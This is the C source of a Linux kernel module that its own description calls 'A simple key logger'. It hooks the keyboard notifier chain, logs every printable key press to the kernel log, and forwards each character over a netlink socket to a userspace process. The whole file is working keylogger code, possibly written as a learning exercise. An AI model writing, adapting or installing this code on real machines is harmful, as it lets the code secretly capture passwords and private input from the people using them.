#include <linux/module.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Test");
MODULE_DESCRIPTION("A simple key logger");
MODULE_VERSION("0.01");

#define PORT 30  // cannot be larger than 31, otherwise we shall get "insmod: ERROR: could not insert module netlink_kernel.ko: No child processes"
char tav;
struct sock *nl_sk = NULL;
int pid;
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct nlmsghdr *nlhead;
    struct sk_buff *skb_out;
    int res;
    struct keyboard_notifier_param *param=(struct keyboard_notifier_param*) p;
    tav=param->value;
    if((int)code == KBD_KEYSYM && param->down == 1 && tav> 0x20 && tav < 0x7f)
    {
        printk(KERN_INFO "PRESSED %c\n",tav);
        skb_out = nlmsg_new(1, 0);    //nlmsg_new - Allocate a new netlink message: skb_out
        if(!skb_out)
        {
            printk(KERN_ERR "Failed to allocate new skb\n");
            return 0;
        }
        nlhead = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, 1, 0);   // Add a new netlink message to an skb
        NETLINK_CB(skb_out).dst_group = 0;                 
        strncpy(nlmsg_data(nlhead), &tav, 1); //char *strncpy(char *dest, const char *src, size_t count)
        res = nlmsg_unicast(nl_sk, skb_out, pid); 
        if(res < 0)
            printk(KERN_INFO "Error while sending back to user\n");

    }
    //else if((int)code == KBD_KEYSYM && param->down == 0 && tav> 0x20 && tav < 0x7f)
    //{
        //printk(KERN_INFO "RELEASED %c\n",tav);
    //}
    return 1;
}
static struct notifier_block keylogger = {.notifier_call = notifier};
static void recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlhead;
    printk(KERN_INFO "Entering to keylogger\n");
    nlhead = (struct nlmsghdr*)skb->data;    //nlhead message comes from skb's data... (sk_buff: unsigned char *data)
    printk(KERN_INFO "received: %s\n",(char*)nlmsg_data(nlhead));
    pid = nlhead->nlmsg_pid; 
}

static int __init keylogger_init(void)
{
    struct netlink_kernel_cfg cfg = {
        .input = recv_msg,
    };
    register_keyboard_notifier(&keylogger);
    nl_sk = netlink_kernel_create(&init_net, PORT, &cfg);
    printk("Entering: %s, protocol family = %d \n",__FUNCTION__, PORT);
    if(!nl_sk)
    {
        printk(KERN_ALERT "Error creating socket.\n");
        return -10;
    }
    printk("Keylogger Init\n");
    return 0;
}

static void __exit keylogger_exit(void)
{
    printk(KERN_INFO "exiting myNetLink module\n");
    netlink_kernel_release(nl_sk);
    unregister_keyboard_notifier(&keylogger);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
